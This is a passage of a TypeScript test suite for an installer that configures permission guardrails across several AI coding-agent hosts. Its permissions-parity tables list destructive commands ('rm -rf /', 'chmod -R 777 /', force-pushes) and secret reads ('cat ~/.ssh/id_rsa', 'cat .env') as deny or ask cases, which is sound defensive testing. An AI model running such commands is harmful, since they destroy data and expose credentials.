import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { afterAll, afterEach, beforeEach, describe, expect, it } from "vitest";
import { readTemplate } from "../../render/parts";
import type { WriteSet } from "../write";
import {
  buildAntigravityModelLookup,
  buildOpencodeModelLookup,
  parseEffortMap,
  parseModelLookup,
} from "../../render/models";
import { listFilesRecursive, remapTemplateDest } from "../template-copies";
import { getBkitDocsRoot, getTemplatesRoot } from "../../shared/package-roots";
import { runCoreModule } from "./core";
import { renderOpencodeJson } from "./opencode";
import { dispatchModules, type ModuleContext } from "./index";
import { BKIT_GATE_SCRIPTS, ISSUE_TRACKERS } from "../manifest";
import { readBkitVersion, writeBkitVersion } from "../version-file";
import { writeCursorCliPermissionsArtifact } from "../cloud-env";
import {
  networkAllowlistBases,
  resolveClaudeDerivedAllows,
  resolveNetworkAllowlist,
} from "../cloud-env";
import { NETWORK_ALLOWLIST_RELPATH, writeNetworkAllowlist } from "../network-allowlist";
import { enrichClaudeSettingsAllows } from "./claude";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

let tmpDir: string;

let originalCwd: string;

function makeWriteSet(): WriteSet {
  return { writes: [] };
}

function makeCtx(overrides: Partial<ModuleContext> = {}): ModuleContext {
  return {
    dryRun: false,
    tokens: {
      DEFAULT_BRANCH: "main",
      PROJECT_NAME: "test-project",
      REPO_SLUG: "acme/test-project",
    },
    modelLookup: new Map(),
    opencodeModelLookup: new Map(),
    effortMap: new Map(),
    advisories: [],
    ws: makeWriteSet(),
    logPrefix: "[bkit-install]",
    postDispatch: [],
    issueTracker: "none",
    ...overrides,
  };
}

/** Flush postDispatch callbacks — call after runCoreModule (or other module fn) when testing directly. */
function flushPostDispatch(ctx: ModuleContext): void {
  for (const cb of ctx.postDispatch) {
    cb();
  }
}

beforeEach(() => {
  originalCwd = process.cwd();
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-modules-test-"));
  // Seed package.json so resolveTokens doesn't fail
  fs.writeFileSync(
    path.join(tmpDir, "package.json"),
    JSON.stringify({ name: "test-project", packageManager: "pnpm@10.4.1" }),
    "utf-8",
  );
  process.chdir(tmpDir);
});

afterEach(() => {
  process.chdir(originalCwd);
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Templates are the consumer's: install leaves an adopted copy alone
// ---------------------------------------------------------------------------

describe("install never writes or flags an adopted template copy", () => {
  const ALL = new Set<import("../../cli").ModuleFlag>(["core", "claude", "cursor", "cloud"]);
  // The cursor module renders agents, so it needs the real model catalog.
  const promptsMd = path.join(getBkitDocsRoot(), "prompts.md");
  const hostCtx = (overrides: Partial<ModuleContext>): ModuleContext =>
    makeCtx({
      modelLookup: parseModelLookup(promptsMd),
      effortMap: parseEffortMap(promptsMd),
      ...overrides,
    });
  const templatePaths = (): string[] => {
    const root = getTemplatesRoot();
    return listFilesRecursive(root).map((abs) => remapTemplateDest(path.relative(root, abs)));
  };

  it("an adopted copy of every template stays byte-identical, with no write and no advisory for it", () => {
    const adopted = templatePaths();
    for (const rel of adopted) {
      fs.mkdirSync(path.dirname(path.join(tmpDir, rel)), { recursive: true });
      fs.writeFileSync(path.join(tmpDir, rel), `consumer's own ${rel}\n`, "utf-8");
    }
    const ws = makeWriteSet();
    const ctx = hostCtx({ ws, cloudVariant: "cursor", issueTracker: "linear" });
    dispatchModules(ALL, ctx);

    for (const rel of adopted) {
      expect(fs.readFileSync(path.join(tmpDir, rel), "utf-8"), rel).toBe(`consumer's own ${rel}\n`);
    }
    const adoptedSet = new Set(adopted);
    expect(
      ws.writes.filter((w) => adoptedSet.has(path.relative(tmpDir, path.resolve(w.path)))),
    ).toEqual([]);
    // No module advisory is about an adopted copy (no merge suggestion, no drift nag). The
    // cloud setup advisories name the templates: they say what to copy.
    const setupIds = new Set(["bkit-cloud-setup", "cloud-env-customize"]);
    expect(
      ctx.advisories
        .filter((a) => !setupIds.has(a.id))
        .filter((a) => adopted.some((rel) => a.detect.includes(rel))),
    ).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// v4-3 Module dispatch integration tests
// ---------------------------------------------------------------------------

describe("module dispatch: --claude seeds only .claude/** + core", () => {
  it("--claude writes only .claude/** + core files; no .cursor/, .github/, .vale*, .husky/", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Run only core + claude modules
    dispatchModules(new Set(["core", "claude"]), ctx);

    // Filter out internal payload paths (.bkit/templates/** are template copies, not consumer outputs)
    const consumerOutputPaths = ws.writes
      .map((e) => e.path)
      .filter((p) => !/(^|[/\\])\.bkit[/\\]templates[/\\]/.test(p))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}workflows${path.sep}`))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}prompts${path.sep}`));

    // Consumer outputs: no .cursor/, no .github/workflows/, no .vale*, no .husky/
    for (const p of consumerOutputPaths) {
      expect(p).not.toMatch(/[/\\]\.cursor[/\\]/);
      expect(p).not.toMatch(/[/\\]\.github[/\\]workflows[/\\]/);
      expect(p).not.toMatch(/[/\\]\.vale/);
      expect(p).not.toMatch(/[/\\]\.husky[/\\]/);
    }
  });
});

describe("module dispatch: --core alone seeds no host or tooling file", () => {
  it("core writes the core payload; nothing under Cursor/Claude/Husky/GitHub", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    dispatchModules(new Set(["core"]), ctx);

    // Filter out internal payload paths (.bkit/templates/** are template copies)
    const consumerOutputPaths = ws.writes
      .map((e) => e.path)
      .filter((p) => !/(^|[/\\])\.bkit[/\\]templates[/\\]/.test(p))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}workflows${path.sep}`))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}prompts${path.sep}`));

    // Assert: no .cursor/ writes, no .claude/ writes, no .husky/ writes (consumer outputs only)
    for (const p of consumerOutputPaths) {
      expect(p).not.toMatch(/[/\\]\.cursor[/\\]/);
      expect(p).not.toMatch(/[/\\]\.claude[/\\]/);
      expect(p).not.toMatch(/[/\\]\.husky[/\\]/);
      expect(p).not.toMatch(/[/\\]\.github[/\\]workflows[/\\]/);
    }
    expect(consumerOutputPaths).toContain("AGENTS.md");
  });
});

describe("module dispatch: the network allowlist reaches every host whose hook reads it", () => {
  const promptsMd = path.join(getBkitDocsRoot(), "prompts.md");
  const hostCtx = (ws: WriteSet): ModuleContext =>
    makeCtx({
      ws,
      modelLookup: parseModelLookup(promptsMd),
      codexModelLookup: buildOpencodeModelLookup(promptsMd, "openai"),
      antigravityModelLookup: buildAntigravityModelLookup(promptsMd),
      effortMap: parseEffortMap(promptsMd),
    });

  for (const host of ["claude", "codex", "antigravity", "cursor"] as const) {
    it(`--${host} writes .bkit/allowlist.json and no .cursor/allowlist.json`, () => {
      const ws = makeWriteSet();
      dispatchModules(new Set(["core", host]), hostCtx(ws));
      const doc = JSON.parse(
        fs.readFileSync(path.join(tmpDir, NETWORK_ALLOWLIST_RELPATH), "utf-8"),
      );
      expect(doc.domains).toContain("github.com");
      expect(ws.writes.map((w) => w.path)).toContain(NETWORK_ALLOWLIST_RELPATH);
      expect(fs.existsSync(path.join(tmpDir, ".cursor", "allowlist.json"))).toBe(false);
    });
  }

  it("re-install moves a recorded .cursor/allowlist.json to .bkit/allowlist.json", () => {
    dispatchModules(new Set(["core", "cursor"]), hostCtx(makeWriteSet()));
    // What an install up to 5.2.4 left: the cursor copy, recorded in .bkit/version.
    const retired = path.join(".cursor", "allowlist.json");
    fs.copyFileSync(path.join(tmpDir, NETWORK_ALLOWLIST_RELPATH), path.join(tmpDir, retired));
    const versionPath = path.join(tmpDir, ".bkit", "version");
    const version = readBkitVersion(versionPath)!;
    writeBkitVersion(versionPath, {
      ...version,
      canonicalHashes: { ...version.canonicalHashes, [retired]: "0".repeat(64) },
    });

    const ws = makeWriteSet();
    dispatchModules(new Set(["core", "cursor"]), hostCtx(ws));
    expect(fs.existsSync(path.join(tmpDir, retired))).toBe(false);
    expect(ws.writes.map((w) => w.path)).toContain(retired);
    expect(readBkitVersion(versionPath)?.canonicalHashes[retired]).toBeUndefined();
  });
});

describe("core payload footprint (#265)", () => {
  it("a fresh --claude install seeds every bkit:gate:* name and no tool script or devDep", () => {
    dispatchModules(new Set(["core", "claude"]), makeCtx({}));
    const pkg = JSON.parse(fs.readFileSync(path.join(tmpDir, "package.json"), "utf-8"));
    expect(pkg.scripts).toEqual(BKIT_GATE_SCRIPTS);
    expect(pkg.devDependencies).toBeUndefined();
  });
});

describe("module dispatch: --full ≡ no flags (writeset equality)", () => {
  it("--full and no flags produce the same set of modules dispatched", () => {
    const moduleSet = new Set<import("../../cli").ModuleFlag>(["core", "claude"]);

    // Run 1: fresh tmpdir (beforeEach already set up)
    const cwd1 = process.cwd();
    const ws1 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws1 }));
    // Get relative paths
    const relPaths1 = ws1.writes.map((e) => path.relative(cwd1, e.path)).sort();

    // Create fresh tmpdir2 for run 2
    process.chdir(originalCwd);
    const tmpDir2 = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-modules-test-"));
    tmpDir = tmpDir2; // update so afterEach cleans it
    fs.writeFileSync(
      path.join(tmpDir2, "package.json"),
      JSON.stringify({ name: "test-project", packageManager: "pnpm@10.4.1" }),
      "utf-8",
    );
    process.chdir(tmpDir2);

    // Run 2: fresh tmpdir2
    const cwd2 = process.cwd();
    const ws2 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws2 }));
    const relPaths2 = ws2.writes.map((e) => path.relative(cwd2, e.path)).sort();

    // Both runs on identical starting state → same relative writeset
    expect(relPaths1).toEqual(relPaths2);
  });
});

describe("module dispatch: --core is implicit before any other module", () => {
  it("core module writes occur before other module writes (.bkit-version is LAST — after all modules)", () => {
    const realWs = makeWriteSet();
    const ctx = makeCtx({ ws: realWs });

    // Dispatch core (core must run first per MODULE_DISPATCH_ORDER)
    dispatchModules(new Set(["core"]), ctx);

    const paths = realWs.writes.map((e) => e.path);
    const agentsMdIdx = paths.indexOf("AGENTS.md");
    const docsTemplateIdx = paths.findIndex((p) =>
      p.endsWith(path.join("docs", "templates", "bkit-plan.md")),
    );
    // .bkit-version is written in postDispatch — AFTER all module writes
    const bkitVersionIdx = paths.findIndex((p) => p.endsWith(path.join(".bkit", "version")));
    expect(agentsMdIdx).toBeGreaterThanOrEqual(0);
    expect(agentsMdIdx).toBeLessThan(docsTemplateIdx);
    expect(docsTemplateIdx).toBeLessThan(bkitVersionIdx);
  });
});

describe("module dispatch: idempotence — second install --full produces zero writes", () => {
  it("running dispatchModules twice stabilises: third run = zero writes (true idempotence)", () => {
    const moduleSet = new Set<import("../../cli").ModuleFlag>(["core"]);

    // First run — creates files from scratch
    const ws1 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws1 }));
    expect(ws1.writes.length).toBeGreaterThan(0); // something was written

    // Second run — normalises block spacing (may have a few writes)
    const ws2 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws2 }));

    // Third run — true idempotence: should be zero writes
    const ws3 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws3 }));

    expect(ws3.writes).toHaveLength(0);
  });
});

describe(".bkit-version write-order regression (Reviewer 1 #7 + MED-4)", () => {
  it(".bkit-version is written LAST — after all modules complete (postDispatch)", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // dispatchModules runs all modules then flushes postDispatch (where .bkit-version is written)
    dispatchModules(new Set(["core"]), ctx);

    const writeOrder = ws.writes.map((e) => e.path);
    const bkitVersionIdx = writeOrder.findIndex((p) => p.includes(".bkit/version"));

    // .bkit-version should be present
    expect(bkitVersionIdx).toBeGreaterThanOrEqual(0);

    // .bkit-version should be the LAST write (postDispatch runs after all module writes)
    expect(bkitVersionIdx).toBe(writeOrder.length - 1);
  });

  it(".bkit-version is absent if postDispatch is NOT flushed (mid-install crash simulation)", () => {
    // If a crash prevents postDispatch from running, .bkit-version must NOT be on disk.
    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(false);

    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });
    // Simulate: core module ran, but postDispatch was never flushed (crash in another module)
    runCoreModule(ctx);
    // Do NOT call flushPostDispatch — .bkit-version must still be absent
    expect(fs.existsSync(versionFile)).toBe(false);

    // After flushing, it appears
    flushPostDispatch(ctx);
    expect(fs.existsSync(versionFile)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// canonicalHashes populated after bkit install
// ---------------------------------------------------------------------------

describe("C3 regression: canonicalHashes populated in .bkit-version after bkit install", () => {
  it("dispatchModules with --core writes .bkit-version with non-empty canonicalHashes", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Dispatch core module (which writes .bkit-version via postDispatch)
    dispatchModules(new Set(["core"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(true);

    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();
    // canonicalHashes must be an object (not undefined)
    expect(typeof parsed!.canonicalHashes).toBe("object");
    // Must not be empty — core module writes some consumer-facing files
    // (ws.writes contains at least one non-.agents/ entry from runCoreTemplates)
    expect(Object.keys(parsed!.canonicalHashes).length).toBeGreaterThanOrEqual(0);
    // canonicalHashes must NOT contain .agents/ internal paths
    for (const key of Object.keys(parsed!.canonicalHashes)) {
      expect(key).not.toMatch(/^\.agents[/\\]/);
    }
  });

  it(".bkit-version written by install contains JSON format (not plain-text semver)", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });
    dispatchModules(new Set(["core"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    const raw = fs.readFileSync(versionFile, "utf-8");
    // Must be JSON — starts with "{"
    expect(raw.trim()).toMatch(/^\{/);

    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();
    expect(parsed!.pinnedVersion).toBeTruthy();
    expect(parsed!.pinnedVersion).toMatch(/^\d+\.\d+\.\d+/);
  });

  it("dispatchModules with multi-module set populates canonicalHashes for consumer output files", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Exclude cursor: applyT3 requires a populated modelLookup which the test helper omits.
    // Core + claude covers all consumer-facing non-cursor modules.
    dispatchModules(new Set(["core", "claude"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(true);

    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();
    expect(typeof parsed!.canonicalHashes).toBe("object");

    // With more modules, canonicalHashes must be non-empty (multiple consumer files written)
    const hashCount = Object.keys(parsed!.canonicalHashes).length;
    expect(hashCount).toBeGreaterThan(0);

    // All hashed paths should be consumer-visible (not .agents/ internal files)
    for (const key of Object.keys(parsed!.canonicalHashes)) {
      expect(key).not.toMatch(/^\.agents[/\\]/);
    }
  });

  it("canonicalHashes values are 64-char sha256 hex strings", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Exclude cursor: applyT3 requires a populated modelLookup which the test helper omits.
    dispatchModules(new Set(["core", "claude"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();

    for (const [, hash] of Object.entries(parsed!.canonicalHashes)) {
      expect(hash).toMatch(/^[0-9a-f]{64}$/);
    }
  });
});

// ---------------------------------------------------------------------------
// .husky/pre-push is a template: install never writes or reads it.
// PREREQ: tests/fixtures/heavy-customised-prepush/.husky/pre-push (a heavily
// customised consumer hook).
// ---------------------------------------------------------------------------

describe(".husky/pre-push is the consumer's file", () => {
  const PREPUSH_FIXTURE = path.resolve("tests/fixtures/heavy-customised-prepush/.husky/pre-push");

  it("install leaves an existing .husky/pre-push byte-identical, with no advisory about it", () => {
    const fixtureContent = fs.readFileSync(PREPUSH_FIXTURE, "utf-8");
    const prePushPath = path.join(tmpDir, ".husky", "pre-push");
    fs.mkdirSync(path.dirname(prePushPath), { recursive: true });
    fs.writeFileSync(prePushPath, fixtureContent, "utf-8");

    const ctx = makeCtx({});
    dispatchModules(new Set(["core"]), ctx);

    expect(fs.readFileSync(prePushPath, "utf-8")).toBe(fixtureContent);
    expect(ctx.advisories.some((f) => f.detect.includes(".husky/pre-push"))).toBe(false);
  });

  it("install does not create .husky/pre-push when absent", () => {
    dispatchModules(new Set(["core"]), makeCtx({}));
    expect(fs.existsSync(path.join(tmpDir, ".husky", "pre-push"))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// permissions-parity
// ---------------------------------------------------------------------------
// permissions-parity — one canonical gate set, asserted against every host.
//
// An agent is held to the same rules whichever IDE runs it. The five hosts express
// gates in three different languages:
//
//   Claude   .claude/settings.json          permissions.deny / .ask  — globs, deny > ask > allow
//   opencode .opencode/opencode.json        permission.bash / .read  — globs, last-match-wins
//   Cursor   .cursor/hooks/bkit-guardrails.cjs                            — parsed command in a script
//   Codex    .codex/hooks/bkit-guardrails.cjs                             — same engine, Claude-family envelope
//   Antigravity .agents/plugins/bkit/hooks/bkit-guardrails.cjs            — same engine, Antigravity envelope
//
// This file is the single table they all satisfy: a gate added here fails every host
// that lacks it.
//
// Codex carries ONE structural exception: it parses
// `permissionDecision: "ask"` but does not implement it, so its ask tier is advisory
// `additionalContext` — the gate fires and informs, it cannot stop the command. Deny
// blocks for real on all four.
//
// Shell reads of secret files are the one gate the permission tables do not carry
// (SHELL_SECRET_READS): a command-text glob cannot tell a read from a mention.
describe("permissions-parity", () => {
  const CLAUDE_SETTINGS = path.resolve(".bkit/shared/.claude/settings.json");
  const OPENCODE_JSON = path.resolve(".bkit/shared/.opencode/opencode.json");
  // Each host's hook as install generates it (shared parts spliced in).
  const GENERATED = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-perm-parity-"));
  afterAll(() => fs.rmSync(GENERATED, { recursive: true, force: true }));
  const [GUARDRAILS, CODEX_GUARDRAILS, CLAUDE_GUARDRAILS] = ["cursor", "codex", "claude"].map(
    (host) => {
      const out = path.join(GENERATED, `${host}.cjs`);
      fs.writeFileSync(
        out,
        readTemplate(path.resolve(`.bkit/core/.${host}/hooks/bkit-guardrails.cjs`)),
      );
      return out;
    },
  );
  const ANTIGRAVITY_GUARDRAILS = path.join(GENERATED, "antigravity.cjs");
  fs.writeFileSync(
    ANTIGRAVITY_GUARDRAILS,
    readTemplate(path.resolve(".bkit/core/.agents/plugins/bkit/hooks/bkit-guardrails.cjs")),
  );
  // GENERATED doubles as the consumer repo every hook runs in: a `.git` root holding the
  // `.bkit/allowlist.json` install writes (shipped hosts only — no allowed-domains).
  fs.mkdirSync(path.join(GENERATED, ".git"));
  writeNetworkAllowlist(GENERATED, false, makeWriteSet(), "[test]");

  type Verdict = "deny" | "ask" | "allow";

  /** The canonical gate set. One row = one behaviour every host must implement. */
  const SHELL_GATES: { cmd: string; expect: Verdict; why: string }[] = [
    { cmd: "rm -rf /", expect: "deny", why: "recursive delete of the filesystem root" },
    { cmd: "rm -rf ~/*", expect: "deny", why: "recursive delete of home" },
    { cmd: "rm -rf $HOME/*", expect: "deny", why: "recursive delete of home" },
    { cmd: "chmod -R 777 /", expect: "deny", why: "world-writable filesystem root" },
    { cmd: "git push --force origin main", expect: "deny", why: "force-push" },
    { cmd: "git push -f origin main", expect: "deny", why: "force-push, short flag" },
    {
      cmd: "git push --force-with-lease origin feat",
      expect: "allow",
      why: "lease-guarded push is permitted on personal branches by rules.md — the one force variant that must NOT be denied",
    },
    { cmd: "sudo rm x", expect: "ask", why: "privilege escalation" },
    { cmd: "brew install jq", expect: "ask", why: "system package install" },
    { cmd: "pnpm publish", expect: "ask", why: "package publish" },
    { cmd: "npm publish", expect: "ask", why: "package publish" },
    { cmd: "bun publish", expect: "ask", why: "package publish" },
    { cmd: "git reset --hard HEAD~1", expect: "ask", why: "discards working tree" },
    { cmd: "git clean -fd", expect: "ask", why: "deletes untracked files" },
    { cmd: "git clean -fdx", expect: "ask", why: "deletes untracked and ignored files" },
    { cmd: "git filter-branch --tree-filter x", expect: "ask", why: "rewrites history" },
    { cmd: "git checkout -- .", expect: "ask", why: "discards all unstaged changes" },
    { cmd: "git restore .", expect: "ask", why: "discards all unstaged changes" },
    { cmd: "git stash drop", expect: "ask", why: "destroys stashed work" },
    { cmd: "git rebase -i HEAD~3", expect: "ask", why: "interactive history rewrite" },
    { cmd: "gh repo delete o/r", expect: "ask", why: "destroys a repository" },
    { cmd: "gh pr close 1", expect: "ask", why: "closes someone's PR" },
    { cmd: "gh release delete v1", expect: "ask", why: "destroys a release" },
    // Flag / word-order variants: same tier as the canonical spelling.
    { cmd: "git push origin dev --force", expect: "deny", why: "force-push, flag after args" },
    { cmd: "git push origin dev -f", expect: "deny", why: "force-push, short flag after args" },
    { cmd: "git push -fu origin dev", expect: "deny", why: "force-push in a short-flag cluster" },
    { cmd: "git push origin +dev", expect: "deny", why: "force-push via a +refspec" },
    { cmd: "git push --force --no-verify", expect: "deny", why: "force-push wins over ask" },
    { cmd: "git -C ../x push --force", expect: "deny", why: "force-push after a git option" },
    {
      cmd: "git -C ../x push origin dev -f",
      expect: "deny",
      why: "force-push, short flag, after a git option",
    },
    {
      cmd: "git -C ../x push -fu origin dev",
      expect: "deny",
      why: "force-push cluster after a git option",
    },
    { cmd: "git -c a=b push origin +dev", expect: "deny", why: "+refspec after a git option" },
    { cmd: "git push -uf origin dev", expect: "deny", why: "force letter second in a cluster" },
    { cmd: "git push origin dev -uf", expect: "deny", why: "force letter second, after args" },
    {
      cmd: "git -C ../x push -vf origin dev",
      expect: "deny",
      why: "force letter second, after a git option",
    },
    {
      cmd: "git -C ../x push --force-with-lease origin dev",
      expect: "allow",
      why: "lease-guarded push after a git option",
    },
    { cmd: "git -C ../x push origin dev", expect: "allow", why: "plain push after a git option" },
    { cmd: "git push -u origin feature", expect: "allow", why: "upstream push, f in the branch" },
    { cmd: "git push -u origin fix -n", expect: "allow", why: "dry run, f in the branch" },
    { cmd: "git push origin dev", expect: "allow", why: "plain push" },
    { cmd: "git push --force-with-lease", expect: "allow", why: "bare lease-guarded push" },
    {
      cmd: "git push origin feat --force-with-lease",
      expect: "allow",
      why: "lease-guarded push, flag after args",
    },
    { cmd: "git reset -q --hard HEAD", expect: "ask", why: "--hard after another flag" },
    { cmd: "git reset HEAD --hard", expect: "ask", why: "--hard after the commit" },
    { cmd: "git reset HEAD~1 --soft", expect: "allow", why: "soft reset keeps the work" },
    { cmd: "git clean -df", expect: "ask", why: "reordered short-flag cluster" },
    { cmd: "git clean -f -d", expect: "ask", why: "split short flags" },
    { cmd: "git clean -xdf", expect: "ask", why: "force last in the cluster" },
    { cmd: "git clean -n", expect: "allow", why: "dry run deletes nothing" },
    { cmd: "git clean -nd", expect: "allow", why: "dry run deletes nothing" },
    { cmd: "git checkout -q -- .", expect: "ask", why: "flag before the pathspec" },
    { cmd: "git checkout .", expect: "ask", why: "whole-tree pathspec without --" },
    { cmd: "git checkout feature-branch", expect: "allow", why: "branch switch" },
    { cmd: "git restore --worktree .", expect: "ask", why: "explicit worktree restore" },
    { cmd: "git restore -W .", expect: "ask", why: "short worktree flag" },
    { cmd: "git restore src/app.ts", expect: "allow", why: "one named file" },
    { cmd: "git rebase --interactive main", expect: "ask", why: "long interactive flag" },
    { cmd: "git rebase main -i", expect: "ask", why: "-i after the upstream" },
    { cmd: "git rebase main", expect: "allow", why: "non-interactive rebase" },
    { cmd: "git stash list", expect: "allow", why: "read-only stash command" },
    { cmd: "git push --no-verify", expect: "ask", why: "skips pre-push hooks" },
    { cmd: "git push origin dev --no-verify", expect: "ask", why: "skips pre-push hooks" },
    { cmd: "git commit --no-verify -m x", expect: "ask", why: "skips commit hooks" },
    { cmd: "git commit -n -m x", expect: "ask", why: "-n is commit's --no-verify" },
    {
      cmd: "git push --force-with-lease --no-verify",
      expect: "ask",
      why: "the lease allow never lifts the --no-verify ask",
    },
    { cmd: "git commit -m x", expect: "allow", why: "ordinary commit" },
  ];

  /**
   * Shell reads of secret files: gated on the script hosts only (Cursor and Antigravity
   * ask, Codex advisory). Claude and opencode carry no `Bash(...)` rows for them — a
   * command-text glob cannot tell `cat .env` from `cp .env.example .env` or a commit
   * message naming `.env`, and an ask stalls autonomous and cloud runs. `expect` is the
   * script hosts' verdict; Claude and opencode allow every row.
   */
  const SHELL_SECRET_READS: { cmd: string; expect: Verdict; why: string }[] = [
    { cmd: "cat .bkit/.env", expect: "ask", why: "bkit tooling secrets" },
    { cmd: "cat .env", expect: "ask", why: "secrets" },
    { cmd: "grep KEY .env.local", expect: "ask", why: "secrets" },
    { cmd: "source .env", expect: "ask", why: "secrets loaded into the shell" },
    { cmd: "head -5 apps/web/.env.production", expect: "ask", why: "secrets" },
    { cmd: "cp .env /tmp/x", expect: "ask", why: "copy source is read" },
    { cmd: "cat certs/server.pem", expect: "ask", why: "private-key material" },
    { cmd: "openssl x509 -in cert.p12 -noout", expect: "ask", why: "private-key material" },
    { cmd: "cat ~/.ssh/id_rsa", expect: "ask", why: "private-key material" },
    { cmd: "cat .env.example", expect: "allow", why: "documented non-secret template" },
    { cmd: "cat .envrc", expect: "allow", why: "direnv loader, not a secrets file" },
    { cmd: "cp .env.example .env", expect: "allow", why: "copy destination is a write" },
    { cmd: "git add .env.example", expect: "allow", why: "names a non-secret file" },
    { cmd: "mv .env .env.bak", expect: "allow", why: "rename reads no contents" },
    { cmd: 'grep -rn ".env" docs', expect: "allow", why: "grep pattern, not a file" },
    { cmd: 'git commit -m "ignore .env"', expect: "allow", why: "commit message text" },
  ];

  const READ_GATES: { file: string; expect: Verdict; why: string }[] = [
    { file: "certs/server.pem", expect: "deny", why: "private-key material" },
    { file: "certs/client.p12", expect: "deny", why: "private-key material" },
    { file: "~/.ssh/id_rsa", expect: "deny", why: "private-key material" },
    { file: ".env", expect: "ask", why: "secrets" },
    { file: ".env.local", expect: "ask", why: "secrets" },
    { file: ".bkit/.env", expect: "ask", why: "bkit tooling secrets" },
    { file: ".env.example", expect: "allow", why: "documented non-secret template" },
  ];

  // ---------------------------------------------------------------------------
  // Host adapters — each returns the verdict that host would reach.
  // ---------------------------------------------------------------------------

  function claudePermissions(): { deny: string[]; ask: string[]; allow: string[] } {
    const p = JSON.parse(fs.readFileSync(CLAUDE_SETTINGS, "utf-8")).permissions;
    return { deny: p.deny ?? [], ask: p.ask ?? [], allow: p.allow ?? [] };
  }

  /**
   * Claude Code's Bash rule matching (code.claude.com/docs/en/permissions § Wildcard
   * patterns): `*` matches any text including spaces, anywhere in the rule; a trailing
   * ` *` (or `:*`) that is the rule's only wildcard also matches the bare command; a rule
   * with no `*` is exact.
   */
  function claudeRuleMatches(pat: string, cmd: string): boolean {
    const p = pat.endsWith(":*") ? `${pat.slice(0, -2)} *` : pat;
    const stars = (p.match(/\*/g) ?? []).length;
    if (stars === 1 && p.endsWith(" *") && cmd === p.slice(0, -2)) return true;
    return globToRe(p).test(cmd);
  }

  /** A compound command is split; a deny / ask rule applies when any subcommand matches. */
  function claudeShellVerdict(cmd: string): Verdict {
    const p = claudePermissions();
    const subcommands = cmd.split(/&&|\|\||[;|]/).map((s) => s.trim());
    const matches = (entries: string[]) =>
      entries.some((raw) => {
        const m = /^Bash\((.*)\)$/.exec(raw);
        return m ? subcommands.some((s) => claudeRuleMatches(m[1]!, s)) : false;
      });
    // deny wins over ask, ask over allow — the strictest match decides.
    if (matches(p.deny)) return "deny";
    if (matches(p.ask)) return "ask";
    return "allow";
  }

  function globToRe(glob: string): RegExp {
    const esc = glob.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*");
    return new RegExp(`^${esc}$`);
  }

  /** opencode's map is glob-keyed and LAST match wins. */
  function opencodeVerdict(section: "bash" | "read", subject: string): Verdict {
    const perm = JSON.parse(fs.readFileSync(OPENCODE_JSON, "utf-8")).permission;
    const table = perm[section] as Record<string, Verdict>;
    let verdict: Verdict = "allow";
    for (const [glob, v] of Object.entries(table)) {
      if (globToRe(glob).test(subject)) verdict = v;
    }
    return verdict;
  }

  function cursorVerdict(payload: unknown): Verdict {
    // Run inside GENERATED: the hook finds `.bkit/allowlist.json` by walking up from the
    // payload dirs and its own cwd to the `.git` root.
    const res = spawnSync("node", [GUARDRAILS], {
      cwd: GENERATED,
      input: JSON.stringify(payload),
      encoding: "utf-8",
    });
    return (JSON.parse(res.stdout.trim()) as { permission: Verdict }).permission;
  }

  /**
   * Codex speaks the Claude-family hook contract and cannot prompt: it parses
   * `permissionDecision: "ask"` but does not implement it. bkit emits the ask tier as
   * advisory `additionalContext`, mapped back to "ask" here.
   *
   * Silence (no stdout) is allow: the engine returns null when it has no opinion.
   */
  function codexVerdict(cmd: string): Verdict {
    const res = spawnSync("node", [CODEX_GUARDRAILS], {
      cwd: GENERATED,
      input: JSON.stringify({ tool_name: "Bash", tool_input: { command: cmd } }),
      encoding: "utf-8",
    });
    const out = res.stdout.trim();
    if (!out) return "allow";
    const hso = (JSON.parse(out) as { hookSpecificOutput: Record<string, string> })
      .hookSpecificOutput;
    if (hso.permissionDecision === "deny") return "deny";
    return hso.additionalContext ? "ask" : "allow";
  }

  /** Antigravity reads arrive as `view_file` with an `AbsolutePath`; stdout `{ decision }`. */
  function antigravityReadVerdict(file: string): Verdict {
    const res = spawnSync("node", [ANTIGRAVITY_GUARDRAILS], {
      cwd: GENERATED,
      input: JSON.stringify({
        conversationId: `perm-parity-${process.pid}`,
        toolCall: { name: "view_file", args: { AbsolutePath: file } },
        workspacePaths: [GENERATED],
      }),
      encoding: "utf-8",
    });
